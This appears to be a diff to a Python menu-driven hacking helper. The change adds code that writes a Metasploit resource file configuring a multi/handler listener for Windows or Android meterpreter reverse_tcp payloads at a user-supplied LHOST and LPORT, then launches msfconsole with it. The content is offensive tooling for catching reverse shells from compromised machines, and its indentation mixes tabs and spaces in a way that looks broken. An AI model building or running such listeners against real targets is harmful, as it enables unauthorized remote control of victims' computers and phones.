@@ -70,18 +70,28 @@ else:
  os.system('clear')
  exit()
 
+# Create Listner file 
+if values == 1:
+	f = open("listener.rc", "w")
+	f.write("use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST {}\nset LPORT {}\nexploit".format(LhOsT, lPoRt))
+	f.close()
+elif values == 2:
+        f = open("listener.rc", "w")
+        f.write("use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {}\nset LPORT {}\nexploit".format(LhOsT, lPoRt))
+        f.close()
+
 print (Fore.YELLOW + '[1] Jump To Msfconsole')
 print (Fore.YELLOW + '[2] Stop')
 value = input(Fore.BLUE + '--> ')
 
 if value == 1:
-   os.system('clear')
-   print (Fore.BLUE + '================================')
-   print (Fore.BLUE + '          Please Wait...')
-   print (Fore.BLUE + '================================')
-   os.system('service postgresql start')
-   os.system('clear')
-   os.system('msfconsole')
+	os.system('clear')
+   	print (Fore.BLUE + '================================')
+   	print (Fore.BLUE + '          Please Wait...')
+   	print (Fore.BLUE + '================================')
+   	os.system('service postgresql start')
+   	os.system('clear')
+	os.system('msfconsole -r listener.rc')
 
 else:
  print '======================'
